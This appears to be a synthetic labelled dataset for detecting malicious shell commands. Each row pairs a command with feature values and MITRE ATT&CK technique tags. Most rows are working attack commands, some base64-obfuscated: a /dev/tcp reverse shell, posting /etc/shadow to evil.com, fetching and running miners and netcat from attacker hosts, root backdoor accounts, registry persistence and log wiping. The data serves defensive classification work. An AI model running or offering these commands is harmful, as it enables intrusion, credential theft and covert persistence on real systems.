echo 'cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
nohup ifconfig -a &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo 'aWQgLUdu' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
cat /etc/group ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9uYy5leGUgbmMuZXhl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'dXNlcm1vZCAtYUcgc3VkbyBjb21wcm9taXNlZF91c2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
ls -la /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cGVybCAtZSAndXNlIFNvY2tldDsgLi4uJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/ &,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'bGRhcHNlYXJjaCAteCAtYiAnZGM9ZG9tYWluLGRjPWNvbScgJyhvYmplY3RDbGFzcz1wZXJzb24pJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo 'eGZyZWVyZHAgL3U6QWRtaW5pc3RyYXRvciAvcDpQYXNzd29yZDEyMyAvdjoxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
sudo echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZSA7IGhpc3RvcnkgLWM=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""dmidecode -t system && > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dW5zaGFkb3cgL2V0Yy9wYXNzd2QgL2V0Yy9zaGFkb3cgPiBjcmFja21l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
time id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bG4gLXMgL3RtcC9iYWNrZG9vci5zaCAvZXRjL2Nyb24uZC9zeXN0ZW0tdXBkYXRl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
ip link show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo 'ZWNobyAnYUdWc2JHOD0nIHwgYmFzZTY0IC1kIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""nmap -sV -p 22,80,443 10.0.0.0/24 ; history -c""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.4, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl  -s  https://api.github.com/repos/user/repo,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup  ./xmrig  --url  stratum+tcp://pool.minexmr.com:443  --user  wallet  &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
sudo ssh -L 8080:internal:80 user@jump.host ; history -c,"[0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
apt-get update,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
time echo 'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3c=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
sudo ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
sudo curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 0, 0]",['T1136_Create_Account'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
sudo find / -writable -type d 2>/dev/null && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 1]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nmap -sn 192.168.1.0/24 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.2, 0.28, 1, 1]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.68, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 ; history -c &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.48, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5 ; echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
adduser  --shell  /bin/bash  --disabled-password  backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo  'cHl0aG9uMyBleHBsb2l0LnB5IC0tdGFyZ2V0IGxvY2FsaG9zdCA7IGNobW9kICt4IC90bXAvcGF5bG9hZA=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup at now + 1 minute <<< '/tmp/payload' | echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
nohup echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""curl -sL http://evil.com/xmrig | bash""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1496_Resource_Hijacking'],synthetic
sed -i 's/old/new/g' config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
time find / -writable -type d 2>/dev/null | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
curl  -sL  http://evil.com/shell.sh  -o  /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""echo 'bm1hcCAtc1YgLS12ZXJzaW9uLWludGVuc2l0eSA1IC1wIDEtNjU1MzUgMTAuMC4wLjEgfCBoaXN0b3J5IC1j' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""adduser --shell /bin/bash --disabled-password backdoor ; chmod +x /tmp/payload""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
systemctl enable --now malicious.service | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time unshadow /etc/passwd /etc/shadow > crackme,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'c21iY2xpZW50IC8vMTAuMC4wLjUvQyQgLVUgQWRtaW5pc3RyYXRvcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
time gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
time wget --post-file=/etc/passwd http://attacker.com/receive | chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'Y2F0IC9ldGMvbmV0d29yay9pbnRlcmZhY2Vz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""du -sh /var/log""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
ps  aux  |  grep  nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
"bash -c ""net user /domain""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
time echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in ; > /dev/null 2>&1 &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
curl -X POST http://evil.com/collect -d @/etc/shadow,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
grep  -r  'password'  /var/www/html  --include='*.php',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
top -bn1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
"bash -c ""cat ~/.aws/credentials""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & | history -c,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
$env:cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')) ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1027_Obfuscated_Files_or_Information', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Zm9yIGkgaW4gJChzZXEgMSAyNTQpOyBkbyBwaW5nIC1jMSAtVzEgMTkyLjE2OC4wLiRpICY+L2Rldi9udWxsICYmIGVjaG8gMTkyLjE2OC4wLiRpOyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""nmap --script=vuln 10.0.0.1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
nohup echo 'PiB+Ly5iYXNoX2hpc3RvcnkgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
time wget -q -O- --header='X-Auth: token123' http://evil.com/cmd | chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup wget -q http://miner.com/xmrig -O /tmp/xmr && chmod +x /tmp/xmr && /tmp/xmr -o pool.minexmr.com:443 &,"[0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 1]",['T1496_Resource_Hijacking'],synthetic
nohup ssh -L 8080:internal:80 user@jump.host &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1021_Remote_Services'],synthetic
